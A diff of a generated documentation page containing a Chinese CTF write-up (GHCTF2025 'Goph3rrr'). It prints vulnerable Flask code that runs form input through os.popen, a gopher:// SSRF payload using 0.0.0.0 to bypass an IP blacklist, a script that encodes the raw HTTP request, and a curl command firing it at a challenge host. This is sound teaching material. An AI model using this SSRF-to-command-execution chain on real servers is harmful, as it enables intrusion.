@@ -2257,6 +2257,8 @@
       
         
       
+        
+      
     
     
     
@@ -2964,6 +2966,36 @@
     
   
     代码执行
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E4%BC%9A%E8%AF%9D%E4%BC%AA%E9%80%A0/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    会话伪造
   
 
     
@@ -4027,47 +4059,47 @@
 <h3 id="_2"><a class="toclink" href="../../ghctf2025-goph3rrr/#_2">解题过程</a></h3>
 <h4 id="step-1"><a class="toclink" href="../../ghctf2025-goph3rrr/#step-1">Step 1：先排除干扰路由</a></h4>
 <p>源码里一堆路由，其中这三个是摆设：</p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="o">/</span><span class="n">Login</span>
-</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="o">/</span><span class="n">Register</span>
-</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a><span class="o">/</span><span class="n">Upload</span>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="o">/</span><span class="n">Login</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="o">/</span><span class="n">Register</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="o">/</span><span class="n">Upload</span>
 </span></code></pre></div>
 <p><strong>旁边还标着 <code>junkcode</code>——作者明说了是混淆视听用的，直接跳过，一个都别管。</strong></p>
 <p><strong>真正有用的只有两个：<code>/Gopher</code> 和 <code>/Manage</code>。</strong></p>
 <h4 id="step-2manage-rce"><a class="toclink" href="../../ghctf2025-goph3rrr/#step-2manage-rce">Step 2：<code>/Manage</code> 是 RCE 点</a></h4>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">'/Manage'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'POST'</span><span class="p">])</span>
-</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a><span class="k">def</span><span class="w"> </span><span class="nf">cmd</span><span class="p">():</span>
-</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a>    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">remote_addr</span> <span class="o">!=</span> <span class="s2">"127.0.0.1"</span><span class="p">:</span>
-</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a>        <span class="k">return</span> <span class="s2">"Forbidden!!!"</span>
-</span><span id="__span-33-5"><a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a>    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s2">"GET"</span><span class="p">:</span>
-</span><span id="__span-33-6"><a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a>        <span class="k">return</span> <span class="s2">"Allowed!!!"</span>
-</span><span id="__span-33-7"><a id="__codelineno-33-7" name="__codelineno-33-7" href="#__codelineno-33-7"></a>    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s2">"POST"</span><span class="p">:</span>
-</span><span id="__span-33-8"><a id="__codelineno-33-8" name="__codelineno-33-8" href="#__codelineno-33-8"></a>        <span class="k">return</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">"cmd"</span><span class="p">))</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">'/Manage'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'POST'</span><span class="p">])</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="k">def</span><span class="w"> </span><span class="nf">cmd</span><span class="p">():</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">remote_addr</span> <span class="o">!=</span> <span class="s2">"127.0.0.1"</span><span class="p">:</span>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>        <span class="k">return</span> <span class="s2">"Forbidden!!!"</span>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s2">"GET"</span><span class="p">:</span>
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>        <span class="k">return</span> <span class="s2">"Allowed!!!"</span>
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s2">"POST"</span><span class="p">:</span>
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>        <span class="k">return</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">"cmd"</span><span class="p">))</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
 </span></code></pre></div>
 <p><strong>三句话读完：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>来源必须是 127.0.0.1      → 外部直连一定被拒
-</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>方法必须是 POST           → 路由上就写死了 methods=['POST']
-</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a>cmd 从 form 里取          → 直接进 os.popen
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>来源必须是 127.0.0.1      → 外部直连一定被拒
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>方法必须是 POST           → 路由上就写死了 methods=['POST']
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>cmd 从 form 里取          → 直接进 os.popen
 </span></code></pre></div>
 <p><strong>注意中间那个 <code>if request.method == "GET"</code> 分支是无用代码——路由只注册了 POST，GET 根本进不来（会 405）。不用管它。</strong></p>
 <p><strong>所以目标是：</strong>让服务器自己向 <code>/Manage</code> 发一条 POST，带上 <code>cmd</code><strong>。</strong></p>
 <h4 id="step-3gopher"><a class="toclink" href="../../ghctf2025-goph3rrr/#step-3gopher">Step 3：<code>/Gopher</code> 给了我们“发请求”的能力</a></h4>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">'/Gopher'</span><span class="p">)</span>
-</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a><span class="k">def</span><span class="w"> </span><span class="nf">visit</span><span class="p">():</span>
-</span><span id="__span-35-3"><a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a>    <span class="n">url</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'url'</span><span class="p">)</span>
-</span><span id="__span-35-4"><a id="__codelineno-35-4" name="__codelineno-35-4" href="#__codelineno-35-4"></a>    <span class="k">if</span> <span class="n">url</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
-</span><span id="__span-35-5"><a id="__codelineno-35-5" name="__codelineno-35-5" href="#__codelineno-35-5"></a>        <span class="k">return</span> <span class="s2">"No url provided :)"</span>
-</span><span id="__span-35-6"><a id="__codelineno-35-6" name="__codelineno-35-6" href="#__codelineno-35-6"></a>    <span class="n">url</span> <span class="o">=</span> <span class="n">urlparse</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
-</span><span id="__span-35-7"><a id="__codelineno-35-7" name="__codelineno-35-7" href="#__codelineno-35-7"></a>    <span class="n">realIpAddress</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">gethostbyname</span><span class="p">(</span><span class="n">url</span><span class="o">.</span><span class="n">hostname</span><span class="p">)</span>
-</span><span id="__span-35-8"><a id="__codelineno-35-8" name="__codelineno-35-8" href="#__codelineno-35-8"></a>    <span class="k">if</span> <span class="n">url</span><span class="o">.</span><span class="n">scheme</span> <span class="o">==</span> <span class="s2">"file"</span> <span class="ow">or</span> <span class="n">realIpAddress</span> <span class="ow">in</span> <span class="n">BlackList</span><span class="p">:</span>
-</span><span id="__span-35-9"><a id="__codelineno-35-9" name="__codelineno-35-9" href="#__codelineno-35-9"></a>        <span class="k">return</span> <span class="s2">"No (≧∇≦)"</span>
-</span><span id="__span-35-10"><a id="__codelineno-35-10" name="__codelineno-35-10" href="#__codelineno-35-10"></a>    <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">([</span><span class="s2">"curl"</span><span class="p">,</span> <span class="s2">"-L"</span><span class="p">,</span> <span class="n">urlunparse</span><span class="p">(</span><span class="n">url</span><span class="p">)],</span> <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
-</span><span id="__span-35-11"><a id="__codelineno-35-11" name="__codelineno-35-11" href="#__codelineno-35-11"></a>    <span class="k">return</span> <span class="n">result</span><span class="o">.</span><span class="n">stdout</span>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">'/Gopher'</span><span class="p">)</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="k">def</span><span class="w"> </span><span class="nf">visit</span><span class="p">():</span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>    <span class="n">url</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'url'</span><span class="p">)</span>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>    <span class="k">if</span> <span class="n">url</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>        <span class="k">return</span> <span class="s2">"No url provided :)"</span>
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>    <span class="n">url</span> <span class="o">=</span> <span class="n">urlparse</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>    <span class="n">realIpAddress</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">gethostbyname</span><span class="p">(</span><span class="n">url</span><span class="o">.</span><span class="n">hostname</span><span class="p">)</span>
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>    <span class="k">if</span> <span class="n">url</span><span class="o">.</span><span class="n">scheme</span> <span class="o">==</span> <span class="s2">"file"</span> <span class="ow">or</span> <span class="n">realIpAddress</span> <span class="ow">in</span> <span class="n">BlackList</span><span class="p">:</span>
+</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>        <span class="k">return</span> <span class="s2">"No (≧∇≦)"</span>
+</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a>    <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">([</span><span class="s2">"curl"</span><span class="p">,</span> <span class="s2">"-L"</span><span class="p">,</span> <span class="n">urlunparse</span><span class="p">(</span><span class="n">url</span><span class="p">)],</span> <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>    <span class="k">return</span> <span class="n">result</span><span class="o">.</span><span class="n">stdout</span>
 </span></code></pre></div>
 <p><strong>做的事：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>① 取 url 参数
-</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a>② 解析出 hostname，解析成 IP，判断是否在黑名单
-</span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a>③ 拦截 file:// 协议
-</span><span id="__span-36-4"><a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a>④ 没过就交给 curl -L &lt;url&gt; 去请求，把输出返回
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>① 取 url 参数
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>② 解析出 hostname，解析成 IP，判断是否在黑名单
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>③ 拦截 file:// 协议
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>④ 没过就交给 curl -L &lt;url&gt; 去请求，把输出返回
 </span></code></pre></div>
 <p><strong>这里的关键是 <code>curl</code>。</strong>curl 支持的不只是 http——<strong>它还支持 <code>gopher://</code>。</strong></p>
 <p><strong><code>gopher://host:port/_&lt;data&gt;</code> 的含义是：连到这个 host 的 port，把 <code>_</code> 后面的内容</strong>原样<strong>作为字节发过去，然后把响应读回来。</strong></p>
@@ -4076,64 +4108,64 @@
 <p><strong><code>realIpAddress in BlackList</code> 拦的是解析出来的 IP。<code>127.0.0.1</code> 这种回环地址几乎一定在黑名单里。</strong></p>
 <p><strong>而 <code>0.0.0.0</code> 在 Linux 上是“本机所有地址”，连它等于连本机，但它不在黑名单里。</strong></p>
 <p><strong>所以 host 用 <code>0.0.0.0</code>：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>gopher://0.0.0.0:8000/_...
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>gopher://0.0.0.0:8000/_...
 </span></code></pre></div>
 <p><strong>连上去之后，<code>REMOTE_ADDR</code> 就是 127.0.0.1，<code>/Manage</code> 的来源校验就过了。</strong></p>
 <h4 id="step-5"><a class="toclink" href="../../ghctf2025-goph3rrr/#step-5">Step 5：报文怎么写</a></h4>
 <p><strong>要发给 <code>/Manage</code> 一条 POST，报文必须是完整 HTTP：</strong></p>
-<div class="language-http highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="nf">POST</span> <span class="nn">/Manage</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
-</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a><span class="na">Host</span><span class="o">:</span> <span class="l">127.0.0.1:8000</span>
-</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a><span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
-</span><span id="__span-38-4"><a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a><span class="na">Content-Length</span><span class="o">:</span> <span class="l">8</span>
-</span><span id="__span-38-5"><a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a>
-</span><span id="__span-38-6"><a id="__codelineno-38-6" name="__codelineno-38-6" href="#__codelineno-38-6"></a><span class="nt">cmd</span><span class="o">=</span><span class="s">ls /</span>
+<div class="language-http highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="nf">POST</span> <span class="nn">/Manage</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="na">Host</span><span class="o">:</span> <span class="l">127.0.0.1:8000</span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="na">Content-Length</span><span class="o">:</span> <span class="l">8</span>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="nt">cmd</span><span class="o">=</span><span class="s">ls /</span>
 </span></code></pre></div>
 <p><strong>几个必须对的地方：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>① 行尾必须 \r\n（CRLF），不是 \n
-</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a>② 头部和 body 之间必须有一个空行（\r\n\r\n）
-</span><span id="__span-39-3"><a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a>③ Content-Length 必须等于 body 的字节数
-</span><span id="__span-39-4"><a id="__codelineno-39-4" name="__codelineno-39-4" href="#__codelineno-39-4"></a>   "cmd=ls /" 正好 8 个字节
-</span><span id="__span-39-5"><a id="__codelineno-39-5" name="__codelineno-39-5" href="#__codelineno-39-5"></a>④ 先 GET 的话进不去——路由只收 POST
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>① 行尾必须 \r\n（CRLF），不是 \n
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>② 头部和 body 之间必须有一个空行（\r\n\r\n）
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>③ Content-Length 必须等于 body 的字节数
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>   "cmd=ls /" 正好 8 个字节
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>④ 先 GET 的话进不去——路由只收 POST
 </span></code></pre></div>
 <p><strong>gopher 里要再做一次 URL 编码，<code>\r\n</code> 变成 <code>%0D%0A</code>：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>gopher://0.0.0.0:8000/_POST%20/Manage%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%3A8000%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%208%0D%0A%0D%0Acmd%3Dls%20/
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>gopher://0.0.0.0:8000/_POST%20/Manage%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%3A8000%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%208%0D%0A%0D%0Acmd%3Dls%20/
 </span></code></pre></div>
 <h4 id="step-6"><a class="toclink" href="../../ghctf2025-goph3rrr/#step-6">Step 6：用脚本拼，别手写</a></h4>
 <p><strong>这条串里 <code>%0D%0A</code> 出现六次，手写必错。用脚本生成：</strong></p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">urllib.parse</span>
-</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a>
-</span><span id="__span-41-3"><a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a><span class="n">body</span> <span class="o">=</span> <span class="s2">"cmd=ls /"</span>
-</span><span id="__span-41-4"><a id="__codelineno-41-4" name="__codelineno-41-4" href="#__codelineno-41-4"></a><span class="n">req</span> <span class="o">=</span> <span class="p">(</span>
-</span><span id="__span-41-5"><a id="__codelineno-41-5" name="__codelineno-41-5" href="#__codelineno-41-5"></a>    <span class="s2">"POST /Manage HTTP/1.1</span><span class="se">\r\n</span><span class="s2">"</span>
-</span><span id="__span-41-6"><a id="__codelineno-41-6" name="__codelineno-41-6" href="#__codelineno-41-6"></a>    <span class="s2">"Host: 127.0.0.1:8000</span><span class="se">\r\n</span><span class="s2">"</span>
-</span><span id="__span-41-7"><a id="__codelineno-41-7" name="__codelineno-41-7" href="#__codelineno-41-7"></a>    <span class="s2">"Content-Type: application/x-www-form-urlencoded</span><span class="se">\r\n</span><span class="s2">"</span>
-</span><span id="__span-41-8"><a id="__codelineno-41-8" name="__codelineno-41-8" href="#__codelineno-41-8"></a>    <span class="s2">"Content-Length: </span><span class="si">%d</span><span class="se">\r\n</span><span class="s2">"</span>
-</span><span id="__span-41-9"><a id="__codelineno-41-9" name="__codelineno-41-9" href="#__codelineno-41-9"></a>    <span class="s2">"</span><span class="se">\r\n</span><span class="s2">"</span>
-</span><span id="__span-41-10"><a id="__codelineno-41-10" name="__codelineno-41-10" href="#__codelineno-41-10"></a>    <span class="s2">"</span><span class="si">%s</span><span class="s2">"</span>
-</span><span id="__span-41-11"><a id="__codelineno-41-11" name="__codelineno-41-11" href="#__codelineno-41-11"></a><span class="p">)</span> <span class="o">%</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">body</span><span class="p">),</span> <span class="n">body</span><span class="p">)</span>
-</span><span id="__span-41-12"><a id="__codelineno-41-12" name="__codelineno-41-12" href="#__codelineno-41-12"></a>
-</span><span id="__span-41-13"><a id="__codelineno-41-13" name="__codelineno-41-13" href="#__codelineno-41-13"></a><span class="nb">print</span><span class="p">(</span><span class="s2">"gopher://0.0.0.0:8000/_"</span> <span class="o">+</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">req</span><span class="p">))</span>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">urllib.parse</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="n">body</span> <span class="o">=</span> <span class="s2">"cmd=ls /"</span>
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="n">req</span> <span class="o">=</span> <span class="p">(</span>
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>    <span class="s2">"POST /Manage HTTP/1.1</span><span class="se">\r\n</span><span class="s2">"</span>
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>    <span class="s2">"Host: 127.0.0.1:8000</span><span class="se">\r\n</span><span class="s2">"</span>
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>    <span class="s2">"Content-Type: application/x-www-form-urlencoded</span><span class="se">\r\n</span><span class="s2">"</span>
+</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>    <span class="s2">"Content-Length: </span><span class="si">%d</span><span class="se">\r\n</span><span class="s2">"</span>
+</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>    <span class="s2">"</span><span class="se">\r\n</span><span class="s2">"</span>
+</span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a>    <span class="s2">"</span><span class="si">%s</span><span class="s2">"</span>
+</span><span id="__span-9-11"><a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a><span class="p">)</span> <span class="o">%</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">body</span><span class="p">),</span> <span class="n">body</span><span class="p">)</span>
+</span><span id="__span-9-12"><a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a>
+</span><span id="__span-9-13"><a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a><span class="nb">print</span><span class="p">(</span><span class="s2">"gopher://0.0.0.0:8000/_"</span> <span class="o">+</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">req</span><span class="p">))</span>
 </span></code></pre></div>
 <p><strong><code>quote()</code> 会把 <code>\r\n</code> 编码成 <code>%0D%0A</code>、空格编码成 <code>%20</code>，你只管把报文写对。</strong></p>
 <h4 id="step-7"><a class="toclink" href="../../ghctf2025-goph3rrr/#step-7">Step 7：打出去</a></h4>
 <p><strong>curl 这边用 <code>-G --data-urlencode</code>，让命令帮忙做一次编码：</strong></p>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a><span class="n">curl</span><span class="p">.</span><span class="n">exe</span> <span class="n">-s</span> <span class="n">-G</span> <span class="p">-</span><span class="n">-data-urlencode</span> <span class="s2">"gopher://0.0.0.0:8000/_POST%20/Manage%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%3A8000%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%208%0D%0A%0D%0Acmd%3Dls%20/"</span> <span class="s2">"http://node6.anna.nssnode.cn:24267/Gopher"</span>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="n">curl</span><span class="p">.</span><span class="n">exe</span> <span class="n">-s</span> <span class="n">-G</span> <span class="p">-</span><span class="n">-data-urlencode</span> <span class="s2">"gopher://0.0.0.0:8000/_POST%20/Manage%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%3A8000%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%208%0D%0A%0D%0Acmd%3Dls%20/"</span> <span class="s2">"http://node6.anna.nssnode.cn:24267/Gopher"</span>
 </span></code></pre></div>
 <p><strong>三个参数各管一件事：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>-s                静默模式：不打印进度条和错误信息
-</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a>-G                把后面 --data 的内容拼到 URL 的 query 上，而不是发 body
-</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a>--data-urlencode  对内容做 URL 编码后再拼（等价于 ?url=&lt;编码后的值&gt;）
